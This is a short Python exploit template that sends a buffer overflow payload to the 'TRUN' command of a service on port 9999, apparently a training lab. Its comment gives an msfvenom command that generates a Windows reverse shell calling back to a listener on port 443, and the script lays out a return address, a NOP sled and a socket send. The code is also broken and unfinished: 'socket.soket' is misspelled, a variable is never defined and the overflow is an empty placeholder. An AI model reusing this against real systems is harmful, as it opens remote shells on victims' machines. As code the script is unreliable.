#!/usr/bin/python
### msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c -a x86 -b "\x00 "
### insert overflow code
### insert nop sled (take note of the size)

import sys, socket

overflow = ()

shellcode = "A" + EIP_no + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

try:
	s=socket.soket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.1.90',9999))
	s.send(('TRUN /.:/' + shellcode))
	s.close()
except:
	print "Error connecting to server"
	sys.exit()